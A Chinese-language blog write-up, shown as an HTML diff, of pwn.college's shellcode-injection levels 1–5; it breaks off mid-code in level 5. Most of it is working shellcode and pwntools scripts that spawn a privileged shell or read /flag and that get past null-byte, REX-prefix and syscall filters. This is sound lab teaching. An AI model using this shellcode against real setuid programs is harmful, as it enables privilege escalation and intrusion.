@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="pwncollege的shellcode模块">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode-injection">
+<meta property="og:url" content="http://example.com/2024/10/11/pwn-college-shellcode-injection/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="pwncollege的shellcode模块">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-11T02:46:58.912Z">
+<meta property="article:modified_time" content="2024-10-21T12:11:36.615Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="pwn-college">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/10/11/pwn-college-shellcode-injection/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>shellcode-injection | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/11/pwn-college-shellcode-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shellcode-injection
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-10-11 10:46:58" itemprop="dateCreated datePublished" datetime="2024-10-11T10:46:58+08:00">2024-10-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-10-21 20:11:36" itemprop="dateModified" datetime="2024-10-21T20:11:36+08:00">2024-10-21</time>
+              </span>
+
+          
+            <div class="post-description">pwncollege的shellcode模块</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -nostdlib -static shell.s -o shellcode</span><br></pre></td></tr></table></figure>
+
+<p>不链接库，静态编译出shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objcopy --dump-section .text=shellcode-raw shellcode</span><br></pre></td></tr></table></figure>
+
+<p>从shellcode中提取代码段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode-raw | /challenge/babyshell_level?</span><br></pre></td></tr></table></figure>
+
+<p>将shellcode注入到level中</p>
+<p>若是执行&#x2F;bin&#x2F;sh则要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode-raw - | /challenge/babyshell_level?</span><br></pre></td></tr></table></figure>
+
+<p><code>shellcraft.pushstr_array()</code>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.pushstr_array(&quot;rdi&quot;,&quot;/bin/sh -p&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>生成将&#x2F;bin&#x2F;sh -p放入rdi的汇编</p>
+<h1 id="level1-无过滤"><a href="#level1-无过滤" class="headerlink" title="level1 无过滤"></a>level1 无过滤</h1><p>本关对输入的shellcode无过滤，长度可达0x1000字节</p>
+<p>那基本上是随便过了</p>
+<p>但尝试直接execve(“&#x2F;bin&#x2F;sh”,null,null)却不能获取flag，当suid程序执行sh或是bash时，他们会将eUID(进程UID)转换为rUID(真实UID)</p>
+<p>有很多条路可走</p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>直接使用suid程序读取flag并输出</p>
+<p>可以自己手动汇编，也可以用pwntools快速实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#直接调用cat读取，它的利用是open()-&gt;sendfileto()：</span><br><span class="line">shellcraft.cat(&quot;/flag&quot;)</span><br><span class="line"></span><br><span class="line">#用open、read、write：</span><br><span class="line">shellcode = shellcraft.open(&#x27;/flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,100)</span><br><span class="line">shellcode += shellcraft.write(1,&#x27;rsp&#x27;,100)</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>execve(“/bin/sh&quot;,null,null)</code>不可行，但是<code>execve(&#39;/bin///sh&#39;, [&#39;sh&#39;,&#39;-p&#39;], 0) </code>可以bypass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcraft.execve(&#x27;sh&#x27;,[&#x27;sh&#x27;,&#x27;-p&#x27;])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    mov rdi,0</span><br><span class="line">    mov rax,0x69</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rax, 0x3b         </span><br><span class="line">    lea rdi, [rip+binsh]  </span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0        </span><br><span class="line">    syscall</span><br><span class="line">binsh:</span><br><span class="line">    .string &quot;/bin/sh&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>直接使用<code>setuid(0)</code>提权，然后使用<code>execve(&quot;/bin/sh&quot;,null,null)</code></p>
+<h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p>是的，还可以使用chmod来让flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov rax, 90          </span><br><span class="line">    lea rdi, [rip+flag]  </span><br><span class="line">    mov rsi, 0x1A4        </span><br><span class="line">    syscall</span><br><span class="line">flag:</span><br><span class="line">    .string &quot;/flag&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hacker@shellcode-injection~level1:~/shellcode-injection$cat /flag</span><br><span class="line">pwn.college&#123;wIbsbWRzQ_OiMO-9h_gi8L5e2B7.01NxIDLwgDMzEzW&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--    1 root root   57 Oct 11 02:08 flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="level2-nop滑行"><a href="#level2-nop滑行" class="headerlink" title="level2 nop滑行"></a>level2 nop滑行</h1><p>shellcraft的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27; , os = &#x27;linux&#x27;)</span><br><span class="line">shellcode = asm(&quot;nop&quot;)*0x700</span><br><span class="line">shellcode += asm(shellcraft.execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0))	#sh的shellcode</span><br><span class="line">sh=process(f&quot;/challenge/babyshell_level2&quot;)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>宏指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rept 0x800</span><br><span class="line">nop</span><br><span class="line">.endr</span><br><span class="line">shellcode</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27; , os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    .rept 0x800</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line"></span><br><span class="line">    mov rdi,0</span><br><span class="line">    mov rax,0x69</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rax, 0x3b         </span><br><span class="line">    lea rdi, [rip+binsh]  </span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0        </span><br><span class="line">    syscall</span><br><span class="line">binsh:</span><br><span class="line">    .string &quot;/bin/sh&quot;</span><br><span class="line">    </span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">#shellcode += asm(shellcraft.execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0))	#sh的shellcode</span><br><span class="line">sh=process(f&quot;/challenge/babyshell_level2&quot;)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="level3-禁止NULL"><a href="#level3-禁止NULL" class="headerlink" title="level3 禁止NULL"></a>level3 禁止NULL</h1><p>使用shellcraft可以一把梭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./shellcode</span><br><span class="line"></span><br><span class="line">./shellcode:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:       48 c7 c7 00 00 00 00    mov    $0x0,%rdi</span><br><span class="line">  401007:       48 c7 c0 69 00 00 00    mov    $0x69,%rax</span><br><span class="line">  40100e:       0f 05                   syscall</span><br><span class="line">  401010:       48 c7 c0 3b 00 00 00    mov    $0x3b,%rax</span><br><span class="line">  401017:       48 8d 3d 10 00 00 00    lea    0x10(%rip),%rdi        # 40102e &lt;binsh&gt;</span><br><span class="line">  40101e:       48 c7 c6 00 00 00 00    mov    $0x0,%rsi</span><br><span class="line">  401025:       48 c7 c2 00 00 00 00    mov    $0x0,%rdx</span><br><span class="line">  40102c:       0f 05                   syscall</span><br><span class="line"></span><br><span class="line">000000000040102e &lt;binsh&gt;:</span><br><span class="line">  40102e:       2f                      (bad)</span><br><span class="line">  40102f:       62                      (bad)</span><br><span class="line">  401030:       69                      .byte 0x69</span><br><span class="line">  401031:       6e                      outsb  %ds:(%rsi),(%dx)</span><br><span class="line">  401032:       2f                      (bad)</span><br><span class="line">  401033:       73 68                   jae    40109d &lt;binsh+0x6f&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用objdump可以看出我们编译的shellcode中有很多00，一大部分是高位寄存器为00，同时还有因为要移动binsh</p>
+<p>这次采用orw</p>
+<p>难点在于如何把&#x2F;flag完整地送入rdi中，可以采用移位或者异或，两种都使用堆栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    #open(&quot;/flag&quot;)</span><br><span class="line">    xor rax,rax</span><br><span class="line">    mov rax, 0x67616c66</span><br><span class="line">    shl rax,8</span><br><span class="line">    mov al, 0x2f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    push 0x2</span><br><span class="line">    pop rax</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,rax</span><br><span class="line">    xor eax,eax</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1 #rdx=0x100</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    push 0x1</span><br><span class="line">    pop rdi</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    push 0x1</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里是移位的方法</p>
+<h1 id="level4-禁止REX前缀"><a href="#level4-禁止REX前缀" class="headerlink" title="level4 禁止REX前缀"></a>level4 禁止REX前缀</h1><p>本关禁止了<code>&#39;H&#39;</code>字节，即0x48，事实上，他禁用的是REX前缀，当我们对64位寄存器进行mov，xor等操作时，就会有0x48字节码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">40100a:       48 31 f6                xor    %rsi,%rsi</span><br></pre></td></tr></table></figure>
+
+<p>但是对push和pop并不会有影响</p>
+<p>所以考虑使用push，pop来进行寄存器控制</p>
+<p>同时，对于eax等32位寄存器使用mov，xor等命令不会有0x48</p>
+<p>这里首先是一个orw的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    	</span><br><span class="line">    lea edi,[eip+flag]    </span><br><span class="line">    push 0x2</span><br><span class="line">    pop rax</span><br><span class="line">    xor esi,esi</span><br><span class="line">    xor edx,edx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov edi,eax</span><br><span class="line">    xor eax,eax</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1 #rdx=0x100</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    push 0x1</span><br><span class="line">    pop rdi</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x1</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">flag: .ascii &quot;/flag&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里读入&#x2F;flag也可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr [rsp], &#x27;/&#x27;</span><br><span class="line">    mov byte ptr [rsp+1], &#x27;f&#x27;</span><br><span class="line">    mov byte ptr [rsp+2], &#x27;l&#x27;</span><br><span class="line">    mov byte ptr [rsp+3], &#x27;a&#x27;</span><br><span class="line">    mov byte ptr [rsp+4], &#x27;g&#x27;</span><br><span class="line">    xor cl,cl</span><br><span class="line">    mov byte ptr [rsp+5],cl </span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi</span><br></pre></td></tr></table></figure>
+
+<p>然后又是<code>execve(&quot;/bin//sh&quot;,[&#39;/bin//sh&#39;,&#39;-p],null)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    push 0x0 #与栈上残余数据分割</span><br><span class="line">	</span><br><span class="line">	#先将/bin送入栈上，再修改栈上内存实现将/bin/sh放入栈上</span><br><span class="line">    push 0x6e69622f </span><br><span class="line">    mov dword ptr [rsp+4],0x68732f2f</span><br><span class="line">    push rsp</span><br><span class="line">    #将/bin/sh的指针压入栈上</span><br><span class="line">    #指针给rdi</span><br><span class="line">    pop rdi #/bin#sh</span><br><span class="line">	</span><br><span class="line">    push 0x702d # -p</span><br><span class="line"></span><br><span class="line">    push rsp # addr of p</span><br><span class="line">    pop rdx # 便于构造参数列表 </span><br><span class="line">    push 0 # 参数列表的结束</span><br><span class="line">    push rdx # 参数列表的第二项</span><br><span class="line">    push rdi # 参数列表第一项</span><br><span class="line">    push rsp # 参数列表</span><br><span class="line">    pop rsi</span><br><span class="line">    </span><br><span class="line">    push 0</span><br><span class="line">    pop rdx</span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<h1 id="level-5-禁止系统调用"><a href="#level-5-禁止系统调用" class="headerlink" title="level 5 禁止系统调用"></a>level 5 禁止系统调用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This challenge requires that your shellcode does not have any `syscall`, &#x27;sysenter&#x27;, or `int` instructions. System calls</span><br><span class="line">are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05</span><br><span class="line">(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to</span><br><span class="line">insert the `syscall` instructions at runtime.</span><br></pre></td></tr></table></figure>
+
+<p>本关禁止了syscall，sysenter，int等指令</p>
+<p>但是也给了个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.</span><br></pre></td></tr></table></figure>
+
+<p>运行程序时插入syscall</p>
+<p>先用objdump看一下基础exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">hacker@shellcode-injection~level5:~/shellcode-injection$ objdump -d ./shellcode</span><br><span class="line"></span><br><span class="line">./shellcode:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:       48 c7 c7 00 00 00 00    mov    $0x0,%rdi</span><br><span class="line">  401007:       48 c7 c0 69 00 00 00    mov    $0x69,%rax</span><br><span class="line">  40100e:       0f 05                   syscall</span><br><span class="line">  401010:       48 c7 c0 3b 00 00 00    mov    $0x3b,%rax</span><br><span class="line">  401017:       48 8d 3d 10 00 00 00    lea    0x10(%rip),%rdi        # 40102e &lt;binsh&gt;</span><br><span class="line">  40101e:       48 c7 c6 00 00 00 00    mov    $0x0,%rsi</span><br><span class="line">  401025:       48 c7 c2 00 00 00 00    mov    $0x0,%rdx</span><br><span class="line">  40102c:       0f 05                   syscall</span><br><span class="line"></span><br><span class="line">000000000040102e &lt;binsh&gt;:</span><br><span class="line">  40102e:       2f                      (bad)</span><br><span class="line">  40102f:       62                      (bad)</span><br><span class="line">  401030:       69                      .byte 0x69</span><br><span class="line">  401031:       6e                      outsb  %ds:(%rsi),(%dx)</span><br><span class="line">  401032:       2f                      (bad)</span><br><span class="line">  401033:       73 68                   jae    40109d &lt;binsh+0x6f&gt;</span><br></pre></td></tr></table></figure>
+
+<p>syscall对应的字节码是0f05，只要没有硬编码的0x0f05即可，那就弄个0x0e05,用inc加成0x0f05,最后jmp一下就行</p>
+<p>这是在堆栈上放置0x050e</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">	</span><br><span class="line">    lea rdi,[rip+binsh]</span><br><span class="line">    push 0</span><br><span class="line">    push 0x702d </span><br><span class="line">    mov rdx,rsp</span><br><span class="line">    push 0x0</span><br><span class="line">    push rdx</span><br><span class="line">    push rdi</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    </span><br><span class="line">    mov rdx,0</span><br><span class="line">    mov rax,0x3b</span><br><span class="line"></span><br><span class="line">    push 0x050e</span><br><span class="line">    inc byte ptr [rsp]</span><br><span class="line">    jmp rsp</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">binsh:  .string 